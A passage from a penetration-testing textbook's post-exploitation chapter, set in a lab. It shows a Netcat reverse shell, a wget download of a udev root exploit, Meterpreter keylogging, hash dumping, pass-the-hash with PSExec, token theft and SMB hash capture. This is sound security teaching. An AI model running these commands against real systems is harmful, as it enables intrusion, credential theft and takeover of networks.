[-] Exploit failed: Rex::TimeoutError Operation timed out. u
meterpreter > getuid
Server username: Book-Win7\Georgia Weidman
Listing 13-10: Using a module to bypass the UAC control 
The module uses a trusted publisher certificate through process injection to bypass the UAC controls. As you can see from the results of the 
getuid command, though our new session is still running as user Georgia 
Weidman, we‚Äôre no longer restricted by UAC. If it was successful you will 
again be presented with a new session. Don‚Äôt worry if you see the line at u. 
As long as the new Meterpreter session opens, the attack was successful.
As shown next, having gotten UAC out of the way, getsystem has no 
trouble gaining system privileges. 
Post Exploitation 287
meterpreter > getsystem
...got system (via technique 1).
Udev Privilege Escalation on Linux
We have yet to try privilege escalation on our Linux target. Let‚Äôs mix things 
up a bit and use public exploit code instead of Metasploit to perform a local 
privilege-escalation attack on Linux. 
We have two ways to interact with our Linux target: via SSH and by 
using the TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has 
fewer available commands than Windows Meterpreter, but in both cases we 
use the shell command to drop out of Meterpreter and into a regular command shell, as shown in Listing 13-11. 
meterpreter > shell
Process 13857 created.
Channel 0 created.
whoami
www-data
Listing 13-11: Dropping to a shell in Meterpreter 
We see that our TikiWiki exploit gained us a session as the user 
www-data, a limited account for the web server, but we have a long way to 
get to root. We have also gained a Bash shell as the user georgia through 
SSH in Chapter 8 with more privileges than www-data, but we‚Äôre still not 
the coveted root. 
Finding a Vulnerability
We need to find a local privilege-escalation vulnerability to exploit. First, we 
need a bit of information about the local system, such as the version of the 
installed kernel and the Ubuntu version. You can find out the Linux kernel 
version with the command uname -a and the Ubuntu release version with the 
command lsb_release -a, as shown in Listing 13-12. 
uname -a
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686 GNU/Linux
lsb_release -a
Distributor ID: Ubuntu
Description: Ubuntu 8.10
Release: 8.10
Codename: intrepid
Listing 13-12: Gathering local information
The Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10, 
codename Intrepid. This Linux system is a bit out of date and is vulnerable 
288 Chapter 13
to multiple known privilege-escalation issues. We‚Äôll focus on an issue in 
udev, the device manager for the Linux kernel that is in charge of loading 
device drivers, or software that facilitates control of a device. 
Vulnerability CVE-2009-1185 describes an issue in udev where the 
daemon, which runs with root privileges, fails to check whether requests to 
load drivers originate from the kernel. Processes in user space, such as ones 
that a user starts, can send messages to udev and convince it to run code 
with root privileges. 
According to the SecurityFocus.com entry for this vulnerability, Ubuntu 
8.10 is an affected platform, and further digging reveals that udev versions 
141 and earlier are affected by this issue. We can check the udev version on 
our target with the command udevadm --version, but we can‚Äôt run the command with the privileges afforded by www-data. Instead, we need to run it 
from our SSH shell as shown here. 
georgia@ubuntu:~$ udevadm --version
124
The udev version on our target, 124, is earlier than 141, which tells us 
that our Linux target is vulnerable.
Finding an Exploit
Kali Linux includes a local repository of public exploit code from Exploitdb
.com at /usr/share/exploitdb, which includes a utility called searchsploit that 
we can use to search for useful code. For example, Listing 13-13 shows the 
results of a search for exploits related to udev. 
root@kali:~# /usr/share/exploitdb/searchsploit udev
 Description Path
---------------------------------------------------------------------- ----------------------
Linux Kernel 2.6 UDEV Local Privilege Escalation Exploit /linux/local/8478.sh
Linux Kernel 2.6 UDEV < 141 Local Privilege Escalation Exploit /linux/local/8572.c
Linux udev Netlink Local Privilege Escalation /linux/local/21848.rb
Listing 13-13: Searching the Exploitdb repository 
There appear to be multiple public exploits for this issue. Let‚Äôs use the 
second exploit, /usr/share/exploitdb/platforms/linux/local/8572.c. 
N ote Always be sure that you fully understand what public exploit code does before running
it against a target. Additionally, there is always a chance that a public exploit won‚Äôt 
run reliably on the target. If possible, set up a lab machine, and test the quality of the 
exploit before you try it on the client target. 
One of the great things about this exploit is that it‚Äôs well commented 
and provides detailed usage information. Listing 13-14 shows an excerpt 
from its C code, which includes usage details. 
Post Exploitation 289
 * Usage:
 * Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 * usually is the udevd PID minus 1) as argv[1].
 * The exploit will execute /tmp/run as root so throw whatever payload you 
 * want in there.
Listing 13-14: Udev exploit usage information
We learn that we need to pass the PID of the udev netlink socket as an 
argument to our exploit. The usage information tells us to look for this 
value in /proc/net/netlink, usually as udev PID minus 1. We also see that the 
exploit will run whatever code it finds in the file /tmp/run as root, so we 
need to put some code there. 
Copying and Compiling the Exploit on the Target
First we need to copy the exploit to our target and compile it so that it can 
run. Luckily, the GCC C compiler is preinstalled on most Linux distributions, so you can often compile local exploit code directly on the target. To 
find out if GCC is installed, enter gcc as shown here. 
georgia@ubuntu:~$ gcc
gcc: no input files
As you can see, GCC complains that it‚Äôs not been given any input, but 
this tells us that GCC is present. Now to copy our exploit code to the Linux 
target. The Linux wget command lets us use the command line to pull a 
file down from a web server, so let‚Äôs copy the C code to our Kali Linux web 
server as shown here. Make sure the apache2 webserver is running in Kali.
root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www
Now switch to your SSH shell, and download the file with wget, as shown 
in Listing 13-15.
georgia@ubuntu:~$ wget http://192.168.20.9/8572.c
--2015-08-14 14:30:51-- http://192.168.20.9/8572.c
Connecting to 10.0.1.24:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2768 (2.7K) [text/x-csrc]
Saving to: `8572.c'
100%[======================================>] 2,768 --.-K/s in 0s 
2015-08-14 14:30:52 (271 MB/s) - `8572.c' saved [2768/2768]
Listing 13-15: Using wget to download a file
Now compile the exploit code with GCC on the Linux target as shown 
here. Use the -o flag to specify an output file name for your compiled code. 
290 Chapter 13
georgia@ubuntu:~$ gcc -o exploit 8572.c
Now to find that udev netlink socket PID mentioned in the exploit‚Äôs 
usage information (Listing 13-14) for our argument. The usage information noted that the PID we need is listed in /proc/net/netlink. cat out the file, 
as shown in Listing 13-16. 
georgia@ubuntu:~$ cat /proc/net/netlink
sk Eth Pid Groups Rmem Wmem Dump Locks
f7a90e00 0 5574 00000111 0 0 00000000 2
da714400 0 6476 00000001 0 0 00000000 2
da714c00 0 4200780 00000000 0 0 00000000 2
--snip--
f7842e00 15 2468 00000001 0 0 00000000 2
f75d5c00 16 0 00000000 0 0 00000000 2
f780f600 18 0 00000000 0 0 00000000 2
Listing 13-16: The /proc/net/netlink file
There‚Äôs more than one PID listed, but we know that the PID we need is 
usually the PID of the udev daemon minus 1. Look at the udev process with 
the ps aux command, as shown here. 
georgia@ubuntu:~$ ps aux | grep udev
root 2469 0.0 0.0 2452 980 ? S<s 02:27 0:00 /sbin/udevd --daemon
georgia 3751 0.0 0.0 3236 792 pts/1 S+ 14:36 0:00 grep udev
The udev daemon‚Äôs PID is 2469. One of the PIDs from Listing 13-16 is 
2468 (udev‚Äôs PID minus 1). Based on the exploit‚Äôs help information, this 
is the value we need. This value is going to change between reboots of the 
Ubuntu target, so make sure you run these commands in your own lab to 
find the correct value.
Adding Code to the /tmp/run Fil
The last thing we need is some code to be run as root in the file /tmp/run. 
Luckily, we also have Netcat installed on our Ubuntu system by default, so 
we can create a simple Bash script to connect back to a listener on our Kali 
system, as discussed in Chapter 2. Here‚Äôs the script. 
georgia@ubuntu:~$ cat /tmp/run 
#!/bin/bash
nc 192.168.20.9 12345 -e /bin/bash
Before running our exploit, we need to set up a listener on our Kali system to catch the incoming Netcat shell. 
root@kali:~# nc -lvp 12345
listening on [any] 12345 ...
Post Exploitation 291
Finally, we‚Äôre ready to run our compiled exploit. Remember to pass the 
PID of the udev netlink socket we found earlier as an argument. 
georgia@ubuntu:~$ ./exploit 2468
Nothing seems to happen on the Linux target, but if you turn back to 
the Netcat listener on Kali, we have a connection. The whoami command tells 
us we now have root privileges, as shown in Listing 13-17. 
root@kali:~# nc -lvp 12345
listening on [any] 12345 ...
192.168.20.11: inverse host lookup failed: Unknown server error : Connection 
timed out
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.11] 33191
whoami
root
Listing 13-17: Gaining root privileges
We‚Äôve successfully escalated our privileges using a public exploit. 
Local Information Gatheri
Once we gain access to a system we should see if any potentially sensitive 
information is present, such as installed software that stores passwords in 
plaintext or using a weak hashing algorithm, proprietary data or source 
code, customer credit card information, or the CEO‚Äôs email account. These 
are all useful bits of information to present in the final report to the customer. Additionally, any information we find may help us break into other 
systems in the network that hold even greater spoils. 
We will look at moving from system to system later in this chapter, but for 
now let‚Äôs look at a few interesting ways to find information on the local system.
Searching for Files
We can tell Meterpreter to search for interesting files. For example in 
Listing 13-18, I tell Meterpreter to look for any filenames that contain the 
name password.
meterpreter > search -f *password*
Found 8 results...
 c:\\WINDOWS\Help\password.chm (21891 bytes)
 c:\\xampp\passwords.txt (362 bytes)
 c:\\xampp\php\PEAR\Zend\Dojo\Form\Element\PasswordTextBox.php (1446 bytes)
 c:\\xampp\php\PEAR\Zend\Dojo\View\Helper\PasswordTextBox.php (1869 bytes)
 c:\\xampp\php\PEAR\Zend\Form\Element\Password.php (2383 bytes)
 c:\\xampp\php\PEAR\Zend\View\Helper\FormPassword.php (2942 bytes)
 c:\\xampp\phpMyAdmin\user_password.php (4622 bytes)
 c:\\xampp\phpMyAdmin\libraries\display_change_password.lib.php (3467 bytes)
Listing 13-18: Using Meterpreter to look for files
292 Chapter 13
Keylogging
Another way to gather information is to let the logged-in user give it to you, 
so to speak. Meterpreter has a keylogger we can use to listen for keystrokes. 
Perhaps the user is logging in to websites or other systems on the network 
while our Meterpreter session is active. Start the keylogger on the Windows XP 
Meterpreter session by entering keyscan_start, as shown here. 
meterpreter > keyscan_start
Starting the keystroke sniffer...
N ote You will capture keystrokes only in your current context. For my example, I used my
original Windows XP session where I am the user georgia in the explorer.exe process, and thus can sniff georgia‚Äôs keystrokes. Another interesting idea is to migrate 
into the winlogon process, where you will see only login information that is typed‚Äî
certainly useful information.
Now switch to Windows XP, and type something. In my example I typed 
ctrl-R to open the Run dialog. Then I entered notepad.exe to start the 
Notepad program and typed hi georgia into Notepad. 
To see any keystrokes the keylogger has logged, enter keyscan_dump as 
shown here. As you can see, all of the keystrokes I typed were logged. 
meterpreter > keyscan_dump
Dumping captured keystrokes...
 <LWin> notepad.exe <Return> hi georgia <Return> 
To stop the keylogger, enter keyscan_stop in Meterpreter as shown here. 
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
Gathering Credentials
In Chapter 9, we worked with password hashes from Windows, Linux, and 
the FileZilla FTP server, but users may have other stored credentials on 
their local system. Metasploit has several post modules for gathering passwords for specific software in /usr/share/metasploit-framework/modules/post/
windows/gather/credentials. For our example, we will look at stealing stored 
credentials from WinSCP, a secure copy tool for Windows. 
As shown in Figure 13-1, open WinSCP, set the File protocol to SCP, the 
Host name to the IP address of the Ubuntu target, and the credentials to 
georgia:password. Click Save As under the login information. 
Post Exploitation 293
Figure 13-1: Connecting with WinSCP 
N ote Like some of the other tools used in this book, the WinSCP GUI may be updated in the
future, so your version may not look exactly like this.
You will be prompted for a session name, as shown in Figure 13-2. Check 
the Save password box before clicking OK. Even WinSCP warns you that 
saving passwords is a bad idea. 
Figure 13-2: Saving credentials in WinSCP 
294 Chapter 13
Now switch back to Kali Linux, and use the module post/windows/gather/
credentials/winscp, as shown in Listing 13-19. Because this is a post module, 
the only option you will need to supply is the ID of the Windows XP session. 
msf > use post/windows/gather/credentials/winscp 
msf post(winscp) > show options
Module options (post/windows/gather/credentials/winscp):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SESSION yes The session to run this module on.
msf post(winscp) > set session 1
session => 1
msf post(winscp) > exploit
[*] Looking for WinSCP.ini file storage...
[*] WinSCP.ini file NOT found...
[*] Looking for Registry Storage...
[*] Host: 192.168.20.9 Port: 22 Protocol: SSH Username: georgia Password: password u
[*] Done!
[*] Post module execution completed
Listing 13-19: Stealing stored credentials from WinSCP 
As shown in Listing 13-19, the module discovers our saved credentials u. 
Based on the software your pentesting targets are running, there may be 
other credential-gathering targets that will come in handy in the field. 
net Commands
The Windows net command will allow us to view and edit network information. Using various options, we can gain valuable information. Drop 
to a Windows command shell using the Meterpreter command shell, as 
shown here. 
meterpreter > shell
--snip--
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
The command net users will show us all local users. Tacking on the 
word /domain at the end of this and many net commands will show information about the domain rather than the local system, but because our targets 
are not joined to a domain, we‚Äôll stick with net users. 
C:\Windows\system32> net users
net users
User accounts for \\
------------------------------------------------------------------------------
Administrator georgia secret Guest 
Post Exploitation 295
We can also see the members of a group with the command net 
localgroup group as shown in Listing 13-20. 
C:\Windows\system32> net localgroup Administrators
net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the computer/domain
Members
-----------------------------------------------------------------------------------------------
Administrator
georgia
secret
The command completed successfully.
Listing 13-20: Viewing local administrators with net commands 
To exit the shell and drop back into Meterpreter, type exit.
These are just a couple of examples of useful net commands. We‚Äôll look 
at using net commands to add a user later in this chapter. 
Another Way In 
In Chapter 5, we used Nmap to run a UDP scan. By definition, UDP scans 
are not as exact as TCP scans. For example, port 69/UDP on the Windows XP 
target, traditionally the port for TFTP, returned open|filtered in our UDP 
Nmap scan. Because our scan did not receive any response, it was unclear if 
anything was listening there at all. Short of fuzzing the TFTP server and possibly crashing it, it would be difficult to ascertain which TFTP software, if any, 
is running. Now that we have access to the system, we can further investigate 
running software for any vulnerabilities we may have missed. 
N ote Earlier in the chapter we used the Meterpreter ps command to view all running processes on the Windows XP target. One of these is 3CTftpSvc.exe, an older version
of the 3Com TFTP service that is subject to a buffer overflow condition in the TFTP 
long transport mode. (We‚Äôll write an exploit for this issue by hand in Chapter 19, but 
there‚Äôs a Metasploit module for this issue as well.) Though it would be difficult for an 
attacker to identify this issue remotely, the software is still vulnerable, and we should 
include it in our pentest report. 
It may be that you won‚Äôt discover a network-facing vulnerability until 
after you have gained access to the system. Without sending random TFTP 
input to the server and analyzing the results, it would be difficult for us to 
find this issue. 
Checking Bash History
One place to look for potentially interesting information on a Linux system 
is in a user‚Äôs Bash history. When a Bash shell is closed, the commands that 
have been executed are written to a file called .bash_history in the user‚Äôs 
296 Chapter 13
home directory. A perhaps rather contrived example where the user‚Äôs password is saved in plaintext in the Bash history file is shown here. 
georgia@ubuntu:~$ cat .bash_history 
my password is password
--snip--
Lateral Movemen
Once we have access to one system in a networked environment, can we use 
it to access additional systems and their sensitive data? If our exploited system is a member of a domain, we can certainly try to compromise a domain 
account or ideally get domain administrator access so that we can log in to 
and manage all systems in the domain. 
But even if you can‚Äôt get control of a domain, you may still be able to 
access the systems in that domain if they were all installed from the same 
system install image with the same local administrator password that has 
never been changed. If we can crack this password for one machine, we may 
be able to log in to many machines in the environment without domain 
access. Also, if a user has an account on multiple systems, he or she may 
use the same password on each system, which might allow us to log in with 
credentials we found elsewhere in the environment. (Good password policies help prevent these kinds of vulnerabilities, but passwords are often the 
weakest link, even in high-security environments.) 
Let‚Äôs look at a few techniques for turning access to one system into 
access to many. 
PSExec
The PSExec technique originated in the Sysinternals Windows management tool set in the late 1990s. The utility worked by using valid credentials 
to connect to the ADMIN$ share on the Windows XP SMB server. PSExec 
uploads a Windows service executable to the ADMIN$ share and then connects to the Windows Service Control Manager using remote procedure 
call (RPC) to start the executable service. The service then sets up an SMB 
named pipe to send commands and remotely control the target system. 
The Metasploit module exploit/windows/smb/psexec implements a very 
similar technique. The module requires a running SMB server on the target and credentials that give access to the ADMIN$ share. 
In Chapter 9, we cracked the password hashes for users on our 
Windows XP target. You can probably imagine using the found credentials and PSExec to gain access to additional systems. Use the credentials 
georgia:password with the PSExec module, as shown in Listing 13-21.
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > show options
Module options (exploit/windows/smb/psexec):
Post Exploitation 297
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST yes The target address
 RPORT 445 yes Set the SMB service port
 SHARE ADMIN$ yes The share to connect to, can be an admin share 
 (ADMIN$,C$,...) or a normal read/write folder share
 SMBDomain WORKGROUP no The Windows domain to use for authentication
 SMBPass no The password for the specified username
 SMBUser no The username to authenticate as
msf exploit(psexec) > set RHOST 192.168.20.10
RHOST => 10.0.1.13
msf exploit(psexec) > set SMBUser georgiau
SMBUser => georgia
msf exploit(psexec) > set SMBPass passwordv
SMBPass => password
msf exploit(psexec) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Connecting to the server...
[*] Authenticating to 192.168.20.10:445|WORKGROUP as user 'georgia'...
[*] Uploading payload...
[*] Created \KoMknErc.exe...
--snip--
[*] Meterpreter session 6 opened (192.168.20.9:4444 -> 192.168.20.10:1173) at 2015-08-14 
14:13:40 -0400
Listing 13-21: Using the PSExec module 
In addition to RHOST, we need to tell the module which SMBDomain, 
SMBUser, and SMBPass to use. Our Windows XP target is not a member of a domain, so we can leave the SMBDomain option at the default, 
WORKGROUP. 
Set SMBUser to georgia u and SMBPass to password v, our discovered 
credentials. Then run the exploit module. The module embeds the chosen 
payload (in this case, the default windows/meterpreter/reverse_tcp) into a 
Windows service image executable. After uploading the executable and contacting Windows Service Control Manager, the service copies the shellcode 
into executable memory for the service process and redirects execution to 
the payload. Thus our payload runs and connects back to our Metasploit 
listener on Kali. Even though we logged on as the user georgia, because our 
payload is running as a system service, our session automatically has system 
privileges. 
N ote This is why we made the change to the Windows XP Security Policy in Chapter 1. If
Windows XP were a member of a domain, we could fill in the SMBDomain option 
and use PSExec to get System access on any system where the domain user was a local 
administrator. This is a great way to move around a network looking for interesting 
information, additional password hashes, and more vulnerabilities.
298 Chapter 13
Pass the Hash 
Our previous attack relied on our ability to reverse the password hash and 
gain access to the plaintext password for a user account. Of course, in the 
case of our Windows XP target, this is trivial because it uses the entirely 
crackable LM hashing algorithm. 
In Chapter 9, we learned that when we have only the NTLM user 
authentication hash of a password, instead of the weaker LM version, our 
ability to reverse the hash in a reasonable amount of time depends on the 
weakness of the password, the strength of our wordlist, and even the algorithms employed by the password-cracking program. If we can‚Äôt reverse the 
password hash, we‚Äôre going to have a tough time logging in to other systems 
with the plaintext credentials.
PSExec comes to the rescue again. When a user logs in over SMB, his or 
her password is not sent to the target in plaintext. Instead, the target system 
issues a challenge that can be answered only by someone with the correct 
password. In this case, the answer to the challenge is the LM- or NTLMhashed password, depending on the implementation. 
When you log in to a remote system, your Windows application calls 
a utility to hash the password, and that hash is sent to the remote system 
for authentication. The remote system assumes that if you send the correct 
hash, you must have access to the correct plaintext password‚Äîthat is, after 
all, one of the fundamentals of one-way hash functions. Can you think of a 
scenario where you might have access to password hashes but not the plaintext passwords?
In Chapter 9, we were able to reverse all password hashes on our target 
systems. Additionally, on our Windows XP target, we were able to reverse 
the LM hashes regardless of the strength of the password. But let‚Äôs simulate a situation where we have only password hashes, as shown with the 
Meterpreter hashdump command in Listing 13-22. 
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:93880b42019f250cd197b67718ac9a3d:86da9cefbdedaf62b66d9b2fe8816c1f:::
secret:1004:e52cac67419a9a22e1c7c53891cb0efa:9bff06fe611486579fb74037890fda96:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:6f552ba8b5c6198ba826d459344ceb14:::
Listing 13-22: Using hashdump
N ote When using the hashdump Meterpreter command against newer Windows operating
systems, you may find that it fails. An alternative is the post module: post/windows/
gather/hashdump. There is even post/windows/gather/smart_hashdump, 
which can not only gather local hashes but also active directory hashes if you have 
exploited a domain controller. So if at first you don‚Äôt succeed in dumping password 
hashes on a pentest, explore additional options.
Post Exploitation 299
Let‚Äôs use the Metasploit PSExec module to take advantage of how SMB 
authenticates and a technique called Pass the Hash. Instead of setting the 
SMBPass option to georgia‚Äôs password, copy in the LM and NTLM hashes for 
georgia from the hashdump in Listing 13-23 as the SMBPass option. 
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
SMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
--snip--
[*] Meterpreter session 7 opened (192.168.20.9:4444 -> 192.168.20.10:1233) at 2015-08-14 14:17:47 
-0400
Listing 13-23: PSExec Pass the Hash
Again we‚Äôre able to use PSExec to get a Meterpreter session. Even 
without knowing the plaintext password, the password hash alone can be 
enough to get access to other systems in the environment using PSExec. 
SSHExec 
Like PSExec for Windows, we can use SSHExec to move through an environment‚Äôs Linux systems if we have even one set of valid credentials, which 
are likely to work elsewhere in the environment. The Metasploit module 
multi/ssh/sshexec and its options are shown in Listing 13-24. 
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) > show options
Module options (exploit/multi/ssh/sshexec):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 PASSWORD yes The password to authenticate with.
 RHOST yes The target address
 RPORT 22 yes The target port
 USERNAME root yes The user to authenticate as.
--snip--
msf exploit(sshexec) > set RHOST 192.168.20.11
RHOST => 192.168.20.11
msf exploit(sshexec) > set USERNAME georgiau
USERNAME => georgia
msf exploit(sshexec) > set PASSWORD passwordv
PASSWORD => password
msf exploit(sshexec) > show payloads
--snip--
linux/x86/meterpreter/reverse_tcp normal Linux Meterpreter, Reverse TCP 
Stager
--snip--
msf exploit(sshexec) > set payload linux/x86/meterpreter/reverse_tcp 
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(sshexec) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(sshexec) > exploit
300 Chapter 13
[*] Started reverse handler on 192.168.20.9:4444 
--snip--
[*] Meterpreter session 10 opened (192.168.20.9:4444 -> 192.168.20.11:36154) 
at 2015-03-25 13:43:26 -0400
meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, 
sgid=1000
meterpreter > shell
Process 21880 created.
Channel 1 created.
whoami
georgia
Listing 13-24: Using SSHExec 
In this example, we know the credentials georgia:password from having 
cracked them in Chapter 9. Although in this case we will just be logging into 
the same host again (similar to what we did in ‚ÄúPSExec‚Äù on page 296), we 
could use this same technique on other hosts in that same environment 
that have an account for georgia. 
As with PSExec, we need valid credentials in order to authenticate. We 
set the USERNAME to georgia u and PASSWORD to password v, and then choose 
linux/x86/meterpreter/reverse_tcp as the payload. 
Unlike with PSExec (which uploaded a binary and ran it as a System 
service, automatically giving us System privileges), with SSHExec we are 
still user georgia. You can see how this exploit could prove to be a quick way 
to move around an environment in search of additional information and 
vulnerabilities on other Linux systems. 
Token Impersonation 
Now that we know we might not even need plaintext passwords to gain 
access to other systems, is there any case where we may not even need the 
password hashes? 
One interesting Windows security construct is the concept of tokens. 
Tokens are primarily used for access control. Based on the token of a process, the operating system can make decisions about which resources and 
operations should be made available to it. 
Think of a token as a kind of temporary key that gives you access to 
certain resources without having to enter your password every time you 
want to perform a privileged operation. When a user logs in to the system 
interactively, such as directly through the console or from a remote desktop, 
a delegation token is created.
Delegation tokens allow the process to impersonate the token on the 
local system as well as on the network, for example on other systems in a 
domain. Delegation tokens contain credentials and can be used to authenticate with other systems that use these credentials, such as the domain 
controller. Tokens persist until reboot, and even if a user logs out, his or her 
Post Exploitation 301
token will still be present on the system until it shuts down. If we can steal 
another token on the system, we can potentially gain additional privileges 
and even access to additional systems. 
Incognito
We‚Äôre on a compromised system: our Windows XP target. Which tokens are 
on the system, and how do we steal them? Incognito was originally a standalone tool developed by security researchers conducting research into using 
token stealing for privilege escalation, but it has since been added as an 
extension to Meterpreter. Incognito will help us enumerate and steal all the 
tokens on a system. 
Incognito is not loaded into Meterpreter by default, but we can add it 
with the load command, as shown here. Use one of your Meterpreter sessions 
currently running as system, or use privilege escalation to elevate your access. 
(System has access to all tokens on the target.)
meterpreter > load incognito
Loading extension incognito...success.
Before we use Incognito, switch users on your Windows XP target and 
log in as secret with the password Password123. This login will create a delegation token on the target for us to impersonate. As we list tokens, Incognito 
searches all handles on the system to determine which ones belong to tokens 
using low-level Windows API calls. To see all the user tokens available with 
the Meterpreter Incognito, enter the command list_tokens -u as shown in 
Listing 13-25. 
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
BOOKXP\georgia
BOOKXP\secret
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Listing 13-25: Enumerating tokens with Incognito
We see tokens for both georgia and secret. Let‚Äôs try stealing secret‚Äôs 
delegation token, effectively gaining the privileges of this user. Use the 
impersonate_token command to steal the token, as shown in Listing 13-26. 
(Note that we use two backslashes to escape the backslash between the 
domain‚Äîin this case, the local machine name‚Äîand the username.) 
meterpreter > impersonate_token BOOKXP\\secret
[+] Delegation token available
[+] Successfully impersonated user BOOKXP\secret
302 Chapter 13
meterpreter > getuid
Server username: BOOKXP\secret
Listing 13-26: Stealing a token with Incognito
Having stolen secret‚Äôs token, if we run getuid we should see that we are 
effectively now the user secret. This can be especially interesting when in a 
domain: If secret is a domain administrator, we are now a domain administrator as well, and we can do things like create a new domain administrator 
account or change the domain administrator‚Äôs password. (We‚Äôll look at how 
to add accounts from the command line in ‚ÄúPersistence‚Äù on page 309.) 
SMB Capture
Let‚Äôs look at one more interesting consequence of token stealing. In a 
domain, password hashes for domain users are stored only on the domain 
controller, which means that running a hashdump on an exploited system 
will give us password hashes only for local users. We don‚Äôt have a domain 
set up, so secret‚Äôs password hash is stored locally, but imagine that secret is 
instead a domain user. Let‚Äôs look at a way of capturing the password hashes 
without gaining access to the domain controller by passing the hash to an 
SMB server we control and recording the results. 
Open a second instance of Msfconsole, and use the module auxiliary/
server/capture/smb to set up an SMB server and capture any authentication 
attempts. Like the client-side attack modules we studied in Chapter 10, this 
module does not directly attack another system; it just sets up a server and 
waits. Set up the module options as shown in Listing 13-27. 
msf > use auxiliary/server/capture/smb 
msf auxiliary(smb) > show options
Module options (auxiliary/server/capture/smb):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 CAINPWFILE no The local filename to store the hashes in Cain&Abel 
 format
 CHALLENGE 1122334455667788 yes The 8 byte challenge 
 JOHNPWFILE no The prefix to the local filename to store the hashes 
 in JOHN format
 SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address 
 on the local machine or 0.0.0.0
 SRVPORT 445 yes The local port to listen on.
 SSL false no Negotiate SSL for incoming connections
 SSLCert no Path to a custom SSL certificate (default is 
 randomly generated)
 SSLVersion SSL3 no Specify the version of SSL that should be used 
 (accepted: SSL2, SSL3, TLS1)
msf auxiliary(smb) > set JOHNPWFILE /root/johnfileu
JOHNPWFILE => johnfile
msf auxiliary(smb) > exploit
Listing 13-27: Using the SMB capture module 
Post Exploitation 303
You can save the results to a CAINPWFILE or a JOHNPWFILE, which 
will save the captured hashes in the formats expected by the Cain and 
Abel password tool for Windows and John the Ripper, respectively. Let‚Äôs 
set it to JOHNPWFILE u because we learned how to use John in Chapter 9.
Now return to your Meterpreter session where you impersonated secret‚Äôs 
token in the previous section, and drop to a shell, as shown next. Because 
we‚Äôve stolen secret‚Äôs token, this shell should be running as secret. Knowing 
that delegation tokens include credentials to authenticate with other systems, we‚Äôll use the net use Windows command to attempt to authenticate 
with our fake SMB capture server. 
Connect to any share you like on the Kali SMB server. The login will 
fail, but the damage will be done. 
meterpreter > shell
C:\Documents and Settings\secret>net use \\192.168.20.9\blah
Returning to your SMB Capture Msfconsole window, you should see 
that you‚Äôve captured a set of password hashes. 
[*] SMB Captured - 2015-08-14 15:11:16 -0400
NTLMv1 Response Captured from 192.168.20.10:1078 ‚Äì 192.168.20.10 
USER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
LMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424 
NTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c
N ote This exercise can be a bit flaky, particularly without a Windows domain present. You
might have trouble capturing the hash and instead get something like this: 
[*] SMB Capture - Empty hash captured from 192.168.20.10:1050 - 192.168.20.10 
captured, ignoring ... 
This is a common issue. Just try to understand the concepts so you can try them in 
client environments where Windows domains are deployed.
The results are saved in the proper format in the JOHNPWFILE 
Metasploit module option for auxiliary/server/capture/smb. For example, 
since we set our JOHNPWFILE as /root/johnfile, the file to feed into John is 
/root/johnfile_netntlm. When you compare the hashes to those dumped with 
hashdump in Listing 13-22, you‚Äôll see that the hashes for secret differ. What‚Äôs 
going on? As it turns out, these hashes are for NETLM and NETNTLM, 
which are a bit different than the regular LM and NTLM Windows hashes 
we worked with in Chapter 9. And when you look at the JOHNPWFILE, you‚Äôll 
see that its format is a bit different from what we‚Äôve seen previously with 
John the Ripper. 
secret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456
441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788
304 Chapter 13
In particular, the hash entry has taken note of the CHALLENGE option set 
in Metasploit. Though the user secret has a local hash on our Windows XP 
target that would save us the trouble of cracking NETLM and NETNTLM 
hashes, this is a useful trick for grabbing password hashes when working 
with domain user accounts, which store their password hashes only on the 
domain controllers. 
Pivoting 
Now let‚Äôs see if we can use access to a system to gain access to another network entirely. Typically an organization has only a few Internet-facing systems‚Äîhosting services that need to be made available to the Internet such 
as web servers, email, VPNs, and so on. These services may be hosted by a 
provider such as Google or GoDaddy, or they may be hosted in house. If 
they are hosted in house, gaining access to them from the Internet may give 
you access to the internal network. Ideally their internal network will be segmented by business unit, level of sensitivity, and so on, such that access to one 
machine does not give direct network access to all machines in the enterprise. 
N ote Internet-facing systems may be dual homed, or a member of multiple networks, namely
the Internet and an internal network. A security best practice is to keep dual-homed 
systems segregated from sensitive internal network resources in a demilitarized zone, 
